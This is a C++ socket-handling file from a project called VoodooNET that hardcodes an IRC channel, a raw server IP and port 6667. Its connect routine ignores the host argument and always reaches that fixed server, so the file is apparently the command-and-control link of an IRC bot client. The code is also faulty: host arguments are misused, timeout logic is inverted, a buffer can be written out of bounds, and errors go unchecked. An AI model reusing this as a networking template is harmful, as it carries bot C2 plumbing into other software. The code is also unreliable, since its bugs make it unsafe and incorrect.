/*
 *  VoodooNET - a modular multi-threaded program for Windows x86/x64 bit
 *	Coded by VoRTeCKZ - @therealvorteckz
 *  VoRTeCKZ Studios
 *
 *	Copyright (C) 2023 - All Rights Reserved.
 *
 * Permission to ("use, copy, and/or modify") this software for
 * any purpose  with or without fee is hereby granted, provided that the above copyright
 * notice and this permission notice appear in all copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
 * INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR
 * PURPOSE AND NONINFRINGEMENT OF THIRD PARTY RIGHTS. IN NO EVENT SHALL THE AUTHORS OR
 * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
 * ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 *
 */

#include <stdio.h>
#include <errno.h>
#include "includes.h"
#include "config.h"

#define ERRNO errno
using namespace std;
DWORD dwLastReceive;


char channel[] = "#vorteckz";
char server[] = "45.61.188.116";
int iPort = 6667;
cSocket::cSocket()
{
//	m_cSocket = INVALID_SOCKET;
//changed
	m_cSocket = 0;
	m_iPort = 0; m_bConnected = false;

}

cSocket::~cSocket()
{
	Disconnect();
}
void cSocket::Init()
{
	ADDMODULE(m_sSockModule, "cSocket", "0.1", "SOCKET Handler Module");

}

bool cSocket::Connect(const char* szHost, int iPort)
{
	if (m_bConnected) return true;

	struct addrinfo* result = NULL;
	struct addrinfo* ptr = NULL;
	struct addrinfo hints;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	cString m_iPort;

	m_iPort.Format("%d", iPort);

	strncpy_s(m_szHost, szHost, sizeof(m_szHost));
	bool bRetVal = false;
	bRetVal = Connect(getaddrinfo(m_szHost, m_iPort.CStr(), &hints, &result), iPort);
	return bRetVal; }





bool cSocket::Connect(const unsigned long lHost, int iPort)
{
	if (m_bConnected) return true;

	cString sPort;
	
	sPort.Format("%d", iPort);

	m_cSocket = (int)socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (m_cSocket == INVALID_SOCKET) { Disconnect(); return false; }
	struct addrinfo* result = NULL;
	struct addrinfo* ptr = NULL;
	struct addrinfo hints;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	int iResult = getaddrinfo(server,sPort.CStr(), &hints, &result);
	ptr = result;
	connect(m_cSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	m_bConnected = true; return true;

}

	
	


bool cSocket::RecvLineIRC(char* szBuffer, int iBufSize)
{
	// if (!m_bConnected) return false;

	int iBufIndex = 0; szBuffer[iBufIndex] = '\0'; bool bReceiving = true;
	while (iBufIndex < iBufSize - 1 && &szBuffer[iBufIndex] && bReceiving)
	{
		if (!Recv(&szBuffer[iBufIndex], 1)) return false;
		szBuffer[iBufIndex + 1] = '\0';
		if (szBuffer[iBufIndex] == '\n' || !szBuffer[iBufIndex])
		{
			if (szBuffer[iBufIndex - 1] == '\r')
				szBuffer[iBufIndex - 1] = '\x00';
			else
				szBuffer[iBufIndex] = '\x00';
			bReceiving = false;
		}
		iBufIndex++;
	}
	szBuffer[iBufSize - 1] = '\0'; return true;
	return true;

}


void cSocket::Disconnect()
{
	if (m_cSocket != SOCKET_ERROR && m_cSocket != INVALID_SOCKET)
		closesocket(m_cSocket);	m_bConnected = false;


}
void cSocket::ClearSocket()
{
	m_cSocket = SOCKET_ERROR; m_iPort = 0; strcpy_s(m_szHost, "");
	m_bConnected = false;
}
bool cSocket::Recv(char* szBuffer, int iBufSize, int* pBytesRead)
{
	return RecvTO(szBuffer, iBufSize, GetTickCount64(), pBytesRead);
}

bool cSocket::RecvTO(char* szBuffer, int iBufSize, unsigned long lTimeOut, int* pBytesRead)
{
	if (m_cSocket == SOCKET_ERROR || !m_bConnected) return false;
	unsigned long lTimeStart = GetTickCount();

	if (!lTimeOut) {
		while (1)
		{
			fd_set fdSet; FD_ZERO(&fdSet); FD_SET(m_cSocket, &fdSet);
			fd_set fdErr; FD_ZERO(&fdErr); FD_SET(m_cSocket, &fdErr);
			timeval tv; tv.tv_sec = 0; tv.tv_usec = 100;
			if ((GetTickCount() - lTimeStart) > lTimeOut) return false;
			if (!select(m_cSocket + 1, &fdSet, NULL, &fdErr, &tv)) continue;
			if (FD_ISSET(m_cSocket, &fdErr)) return false;
			if (FD_ISSET(m_cSocket, &fdSet)) break;
		}
	}
	int iBytesRead = 0;
	iBytesRead = recv(m_cSocket, szBuffer, iBufSize, 0);


	if (pBytesRead) *pBytesRead = iBytesRead;
	if (iBytesRead == SOCKET_ERROR || iBytesRead == 0)
		if (ERRNO == EWOULDBLOCK) return true; else return false;



	return true;
}

bool cSocket::Write(const char* szBuffer, int iBufSize, int* pBytesWritten)
{
//	g_cVoodoo->m_cLogging.PrintLine("WriteDebug", "%s", szBuffer);

	//if (m_cSocket == SOCKET_ERROR || !m_bConnected) return false;
	
	int iBytesWritten = 0;
	iBytesWritten = send(m_cSocket, szBuffer, iBufSize, 0);
	if (pBytesWritten) *pBytesWritten = iBytesWritten;
	if (iBytesWritten == SOCKET_ERROR || iBytesWritten == 0)
		if (ERRNO == EWOULDBLOCK) return true; else return false;
	return true;
}
bool cSocket::RecvLine(char* szBuffer, int iBufSize)
{
	if (!m_bConnected) return false;

	int iBufIndex = 0; szBuffer[iBufIndex] = '\0'; bool bReceiving = true;
	while (iBufIndex < iBufSize - 1 && &szBuffer[iBufIndex] && bReceiving)
	{
		if (!Recv(&szBuffer[iBufIndex], 1, 0)) return false;
		szBuffer[iBufIndex + 1] = '\0';
		if (szBuffer[iBufIndex] == '\n' || szBuffer[iBufIndex] == '\r' || !szBuffer[iBufIndex])
		{
			szBuffer[iBufIndex - 1] = '\x00'; bReceiving = false;
		}
		iBufIndex++;
	}
	szBuffer[iBufSize - 1] = '\0'; return true;
	return true;
}





bool cSocket::IsConnected() {

		fd_set fdSet; FD_ZERO(&fdSet); FD_SET(m_cSocket, &fdSet);
		timeval tv; tv.tv_sec = 0; tv.tv_usec = 0;
		if (!select(m_cSocket + 1, NULL, &fdSet, NULL, &tv)) return false;
		if (FD_ISSET(m_cSocket, &fdSet)) return true;
	
	return false;
}

bool cSocket::GotError() {

		fd_set fdSet; FD_ZERO(&fdSet); FD_SET(m_cSocket, &fdSet);
		timeval tv; tv.tv_sec = 0; tv.tv_usec = 0;
		if (!select(m_cSocket + 1, NULL, NULL, &fdSet, &tv)) return false;
		if (FD_ISSET(m_cSocket, &fdSet)) return true;
	
	return false;
}